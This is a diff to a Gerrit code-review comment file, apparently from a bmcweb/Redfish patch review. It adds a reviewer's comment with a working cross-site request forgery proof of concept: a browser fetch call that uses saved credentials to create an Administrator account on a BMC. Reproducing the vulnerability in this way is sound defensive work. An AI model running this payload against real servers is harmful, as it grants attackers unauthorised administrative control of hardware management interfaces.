@@ -153,6 +153,30 @@
       },
       "revId": "6eec41fce6d71ec8204c987b1581137ab49f7852",
       "serverId": "adbd0a64-1f21-4d83-b585-671fe73cb6e4"
+    },
+    {
+      "unresolved": false,
+      "key": {
+        "uuid": "73ae0db4_ff9226fd",
+        "filename": "/COMMIT_MSG",
+        "patchSetId": 1
+      },
+      "lineNbr": 10,
+      "author": {
+        "id": 1001114
+      },
+      "writtenOn": "2022-10-02T20:25:32Z",
+      "side": 1,
+      "message": "Thank you very much Ed.\n\nAbout reproduction following code performs attack (because browser automatically use saved certificate):\n```\nwindow.fetch(\u0027https://\u003cbmcwebAddress\u003e/redfish/v1/AccountService/Accounts/\u0027,\n    {\n        method: \"POST\",\n        mode: \"no-cors\",\n        credentials: \"include\",\n        body: JSON.stringify({\u0027UserName\u0027: \u0027stefan\u0027, \u0027Enabled\u0027: true, \u0027Password\u0027:\u0027test123!\u0027, \u0027RoleId\u0027:\u0027Administrator\u0027})\n    })\n    .then(function(data){\n        console.log(data);\n    }).catch(function(error) {\n        console.log(\u0027Error while doing request\u0027, error);\n    });\n```\n    \nTo perform attack no-cors mode is necessary, and in no-cors mode we cannot send Content-Type to application/json",
+      "parentUuid": "eb5a8a22_2d500762",
+      "range": {
+        "startLine": 9,
+        "startChar": 0,
+        "endLine": 10,
+        "endChar": 32
+      },
+      "revId": "6eec41fce6d71ec8204c987b1581137ab49f7852",
+      "serverId": "adbd0a64-1f21-4d83-b585-671fe73cb6e4"
     }
   ]
 }
